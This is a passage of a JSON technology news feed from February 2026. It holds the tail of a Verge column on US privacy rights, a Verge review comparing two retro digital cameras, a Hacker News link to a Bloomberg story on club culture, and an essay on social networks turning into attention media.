does it even worse. According to internal documents , Meta also apparently believes that the Trump administration’s highly public flouting of civil liberties (or what Meta euphemistically deems a “dynamic political environment”) will keep activists distracted, leaving it free to push invasive features like facial recognition into products. But the administration’s actions are making the dangers of these systems more and more difficult to ignore. It’s one thing to know the government could look up personal information about you. It’s another to have ICE agents intimidate you by dropping your name. Not all of today’s privacy nightmares have easy regulatory solutions. But privacy groups have said for years that there are obvious ways to start improving the situation. A long-standing wishlist from a coalition that includes EPIC, PIRG, and others suggests creating a new independent federal Data Protection Agency, as well as a private right of action that would let individuals sue over violations of privacy laws. One of the most recent proposals is the Data Justice Act , a piece of model legislation outlined last month by a group of scholars at NYU Law. It’s aimed at limiting state collection and use of our deep digital footprints, aiming to redefine personal data “not as information the state may freely access, but as something inherently ours.” There’s likely no turning back the clock on many digital technologies — nor, in many cases, would people want to. But it’s past time for more lawmakers to take the risks these technologies create seriously and decide it’s worth fighting back. In many ways, governments across the world are actually going backward on privacy, thanks to the rise of online age-gating . In the US, the Supreme Court has already okayed age verification for sites with a large volume of adult content. Now, multiple states have passed laws that require it for essentially every app on your phone, a policy the Supreme Court seems likely to consider sometime this year. Virtually every problem in tech regulation is intertwined, so tech monopolies also exacerbate privacy problems by reducing competition and concentrating information in a few places where it can be exploited. (That’s another issue Congress has taken up but failed to follow through on .) Also, laws don’t work if the government won’t fairly enforce them, so the Trump administration’s era of gangster tech regulation needs to end. One of the simplest rallying cries for privacy in recent years is “ ban facial recognition ” — typically from use by government and law enforcement, but there’s a push to limit its rollout privately on smart glasses, too. Follow topics and authors from this story to see more like this in your personalized homepage feed and to receive email updates. Adi Robertson Column Policy Politics The Stepback",
      "cover_image_url": "https://platform.theverge.com/wp-content/uploads/sites/2/2026/02/268314_Stepback-_The_US_desperately_needs_privacy_rights_CVirginia2.jpg?quality=90&strip=all&crop=0%2C10.732984293194%2C100%2C78.534031413613&w=1200"
    },
    {
      "industry": "technology",
      "source": "The Verge",
      "title": "Retro camera shootout: Camp Snap Pro vs. Flashback One35 V2",
      "url": "https://www.theverge.com/gadgets/882641/camp-snap-pro-flashback-one35-v2-digicam-camera-comparison-review",
      "published": "2026-02-22T13:00:00+00:00",
      "summary": "There's been a surge of interest over the last few years in inexpensive digital cameras. Younger folks are snapping up old point-and-shoots because they view the aesthetic as more authentic and more appealing than smartphone images. Companies are even rereleasing old tech at new prices. And there are cameras like the original Camp Snap: a [&#8230;]",
      "content_text": "There’s been a surge of interest over the last few years in inexpensive digital cameras. Younger folks are snapping up old point-and-shoots because they view the aesthetic as more authentic and more appealing than smartphone images. Companies are even rereleasing old tech at new prices . And there are cameras like the original Camp Snap : a $70 single-button point-and-shoot with no screen, designed as a modern take on a disposable film camera. It’s cheap enough to send off with a kid to summer camp and accessible enough for just about anyone to enjoy its lo-fi aesthetic. I’ve been testing two charming examples of this formula: the $99 Camp Snap Pro (aka CS-Pro), which is an upgrade to the original Camp Snap and looks like an all-plastic Fujifilm X100 , and the Flashback One35 V2 , which costs $119 and looks exactly like a disposable camera. Both cameras aim to give you the aesthetics and screen-free experience of a disposable film camera with the convenience of digital. One of them hits the mark. $99 The Good Simple dial for choosing four on-demand film profiles Xenon flash with two settings Has a tripod mount (rare for these kinds of cameras) No app, Wi-Fi, or Bluetooth connection needed The Bad Setting date and time requires a screwdriver Silver-and-black styling is classic but a little boring Non-replaceable battery $119 The Good Compact size Fun and intuitive companion app Analog-like ritual of shooting with in-app “developing” RAW capture is possible (if you want that) The Bad Lots of missed shots due to slow-to-wake advance dial Lens is too close to grip, leading to fingers in shots Film styles sometimes failed to “load” in the camera Non-replaceable battery Both the Camp Snap Pro and Flashback One35 V2 are compact and built from lightweight, cheap plastic. The Flashback is noticeably smaller, about the size of a disposable film camera, and it slips into my back pocket better. But both are best toted in a jacket pocket, small bag, or purse. They don’t feel precious like regular cameras. My wife and I own an original Camp Snap, and we’d often toss it in our diaper bag without giving a damn. Neither camera is special when it comes to specs (scroll to the bottom for a side-by-side comparison table). The Camp Snap Pro’s 22.5mm-equivalent lens and 16-megapixel sensor are respectively wider and higher resolution than the standard Camp Snap (8-megapixel, 32mm equivalent). The Flashback V2 has a 13-megapixel sensor. These basic smartphone-sized image sensors and tiny lenses yield image quality somewhere between a disposable film camera and an old phone. Unlike film, you’re not paying money with each shot. And they both feature proper xenon flashes for brightly illuminating dark settings at close distances — a sought-after look that also helps alleviate their awful low-light performance. (The original Camp Snap’s LED flash is mostly useless and not as flattering.) 1/15 The Flashback (right) is the cuter camera, but the Camp Snap Pro (left) is the better one. But the biggest way these cameras differ is how you use them. The Camp Snap Pro has a dial that lets you swap between four filters; the defaults are STD (standard), VTG1 (vintage 1, with a warm magenta tone), VTG2 (vintage 2, with a green tone and boosted blues), and B&W (black and white). Each preset is user-customizable, allowing you to replace each with a custom look made in Camp Snap’s online Filter Builder . The original Camp Snap has a community built around free and paid downloadable filters, though some aren’t available on the CS-Pro yet. The included 4GB microSD card fits over 1,000 photos, and you can download them via USB-C cable or microSD card reader. The Flashback also has four preset filters: classic, mono (black and white), beta (a reddish-toned look), and cine (exaggerating a teal-and-orange aesthetic). But you can only change between them in the camera’s companion app ( iOS / iPad and Android ), and you use them as “rolls” for up to 27 shots at a time. This is meant to mimic a disposable film camera. Once you select a filter, you’re stuck with it for the whole “roll,” though you can download a roll early and start over. The One35 V2 pairs to a phone or tablet via Bluetooth, allowing you to check battery level, enable a self-timer, or change your film type. Downloading the images to your device requires either Wi-Fi or a cable. By default, the app makes you wait 24 hours to see your images. Alternatively, images can be instantly developed by activating Digicam Mode, which I enabled after just one batch of shots. 1/35 Camp Snap Pro sample photos. It’s a nice app, but virtual roll-by-roll shooting quickly goes from charming to annoying. I’ve had a few occasions where my film type didn’t apply to the camera, causing rolls to come out in the wrong color tones or in black and white when I thought I was shooting color. Waiting to see your photos, and the occasional unexpected result, are part of the charm of analog photography, but I never dropped off a roll of black-and-white film and had it come back in color or vice versa. The One35’s dedication to the bit has other drawbacks as well. After 27 shots, you can’t use the camera again until you offload your pictures to the app or a computer. This negates one of the major advantages of digital cameras, not to mention the whole point of a #screenfree camera. You can’t just hand it to a kid and set them loose with it. And its reliance on a disposable-camera-style advance winder to wake it up and re-cock the shutter means you constantly miss shots. The advance dial takes only one turn to wake the camera but around eight to prime the shutter. It doesn’t stay ready to shoot like a proper film disposable camera, which makes no sense for something designed around spontaneity. 1/43 Flashback One35 V2 sample photos. When asked if this issue could be circumvented, Flashback’s external PR rep Bethany Andros told The Verge , “Yes, this is a known issue we’re trying to fix right now.” A firmware update will help, but it won’t solve the Flashback’s other big handling issue: due to lens placement, wrapping your hand around the camera’s sizable grip often results in my fingers getting in the shot. What’s the point of having a nice contoured grip if you can’t use it? As far as image quality, the Camp Snap Pro yields a significantly sharper and cleaner image than the Flashback. Even the standard Camp Snap, which I also used for comparison shots, has slightly better image quality. “Better” is of course subjective, since these cameras are all about vibes. There’s none of the technical sharpness or minimal noise we’re used to in modern phones and full-size cameras, but the aesthetic flaws and limitations are kind of the point. I’ve even come across users within the Flashback subreddit preferring the One35 V1’s image quality over the V2, because it looks worse . 1/13 Click through this gallery for direct comparisons between the Camp Snap Pro, Flashback, and original Camp Snap. I recommend the Camp Snap Pro, and I simply can’t say the same for the Flashback. The One35’s concept is fun and endearing (and its see-through variants look amazing ), but by trying to replicate the physical experience of the disposable camera, it winds up keeping the old flaws and adding new ones. The Camp Snap Pro is focused on the utility disposable cameras provided in the days before digital cameras and smartphones. It’s cheaper than the Flashback, easier to use, more customizable, and yields a higher image quality — but not too high. It’s perfect for someone who wants something just a little better than the basic Camp Snap, or at least a proper flash. If you don’t take the bait on the Flashback’s nostalgic stylings, there’s just no comparison. Camp Snap Pro Flashback One35 V2 Resolution 16 megapixels 13 megapixels Sensor Type-1/3.06 CMOS Not disclosed ISO range Not disclosed Not disclosed RAW support No Yes, DNG format Focal length 2.56mm (22.5mm equivalent) Not disclosed Aperture f/2.2 Not disclosed Focusing Fixed Fixed Focus range 3 ft / 0.9 m to infinity Not disclosed Lens filter thread 37mm None Shutter speed range 1/30 to 1/1000 Not disclosed Number of filter presets 4 4 Custom filter support Yes No Self-timer No Yes Storage 4GB microSD, removable Not disclosed Tripod mount Yes No Connectivity USB-C USB-C, Bluetooth, Wi-Fi Battery estimated 500 shots, USB-C rechargeable, non-removable estimated 15 rolls / 405 shots, USB-C charging, non-removable Dimensions 5 x 3 x 1 inches / 127 x 76.2 x 25.4 mm Not disclosed Weight 7 oz / 198 g Not disclosed Photography by Antonio G. Di Benedetto / The Verge Follow topics and authors from this story to see more like this in your personalized homepage feed and to receive email updates. Antonio G. Di Benedetto Camera Reviews Cameras Gadgets Reviews Tech",
      "cover_image_url": "https://platform.theverge.com/wp-content/uploads/sites/2/2026/02/268363_Camp_Snap_Pro_Flashback_One35_V2_camera_review_ADiBenedetto_0001.jpg?quality=90&strip=all&crop=0%2C10.732984293194%2C100%2C78.534031413613&w=1200"
    },
    {
      "industry": "technology",
      "source": "Hacker News (Frontpage)",
      "title": "The Dance Floor Is Disappearing in a Sea of Phones",
      "url": "https://www.bloomberg.com/news/features/2026-02-20/a-boom-in-electronic-dance-music-is-changing-club-culture",
      "published": "2026-02-22T12:41:37+00:00",
      "summary": "<p>Article URL: <a href=\"https://www.bloomberg.com/news/features/2026-02-20/a-boom-in-electronic-dance-music-is-changing-club-culture\">https://www.bloomberg.com/news/features/2026-02-20/a-boom-in-electronic-dance-music-is-changing-club-culture</a></p> <p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=47110549\">https://news.ycombinator.com/item?id=47110549</a></p> <p>Points: 48</p> <p># Comments: 41</p>",
      "content_text": "<p>Article URL: <a href=\"https://www.bloomberg.com/news/features/2026-02-20/a-boom-in-electronic-dance-music-is-changing-club-culture\">https://www.bloomberg.com/news/features/2026-02-20/a-boom-in-electronic-dance-music-is-changing-club-culture</a></p> <p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=47110549\">https://news.ycombinator.com/item?id=47110549</a></p> <p>Points: 48</p> <p># Comments: 41</p>",
      "cover_image_url": null
    },
    {
      "industry": "technology",
      "source": "Hacker News (Frontpage)",
      "title": "Attention Media ≠ Social Networks",
      "url": "https://susam.net/attention-media-vs-social-networks.html",
      "published": "2026-02-22T12:36:46+00:00",
      "summary": "<p>Article URL: <a href=\"https://susam.net/attention-media-vs-social-networks.html\">https://susam.net/attention-media-vs-social-networks.html</a></p> <p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=47110515\">https://news.ycombinator.com/item?id=47110515</a></p> <p>Points: 150</p> <p># Comments: 59</p>",
      "content_text": "Attention Media ≠ Social Networks By Susam Pal on 20 Jan 2026 When web-based social networks started flourishing nearly two decades ago, they were genuinely social networks. You would sign up for a popular service, follow people you knew or liked and read updates from them. When you posted something, your followers would receive your updates as well. Notifications were genuine. The little icons in the top bar would light up because someone had sent you a direct message or engaged with something you had posted. There was also, at the beginning of this millennium, a general sense of hope and optimism around technology, computers and the Internet. Social networking platforms were one of the services that were part of what was called Web 2.0, a term used for websites built around user participation and interaction. It felt as though the information superhighway was finally reaching its potential. But sometime between 2012 and 2016, things took a turn for the worse. First came the infamous infinite scroll. I remember feeling uneasy the first time a web page no longer had a bottom. Logically, I knew very well that everything a browser displays is a virtual construct. There is no physical page. It is just pixels pretending to be one. Still, my brain had learned to treat web pages as objects with a beginning and an end. The sudden disappearance of that end disturbed my sense of ease. Then came the bogus notifications. What had once been meaningful signals turned into arbitrary prompts. Someone you followed had posted something unremarkable and the platform would surface it as a notification anyway. It didn't matter whether the notification was relevant to me. The notification system stopped serving me and started serving itself. It felt like a violation of an unspoken agreement between users and services. Despite all that, these platforms still remained social in some diluted sense. Yes, the notifications were manipulative, but they were at least about people I actually knew or had chosen to follow. That, too, would change. Over time, my timeline contained fewer and fewer posts from friends and more and more content from random strangers. Using these services began to feel like standing in front of a blaring loudspeaker, broadcasting fragments of conversations from all over the world directly in my face. That was when I gave up on these services. There was nothing social about them anymore. They had become attention media . My attention is precious to me. I cannot spend it mindlessly scrolling through videos that have neither relevance nor substance. But where one avenue disappeared, another emerged. A few years ago, I stumbled upon Mastodon and it reminded me of the early days of Twitter. Back in 2006, I followed a small number of folks of the nerd variety on Twitter and received genuinely interesting updates from them. But when I log into the ruins of those older platforms now, all I see are random videos presented to me for reasons I can neither infer nor care about. Mastodon, by contrast, still feels like social networking in the original sense. I follow a small number of people I genuinely find interesting and I receive their updates and only their updates. What I see is the result of my own choices rather than a system trying to capture and monetise my attention. There are no bogus notifications. The timeline feels calm and predictable. If there are no new updates from people I follow, there is nothing to see. It feels closer to how social networks used to work originally. I hope it stays that way.",
      "cover_image_url": null
    }
  ]
}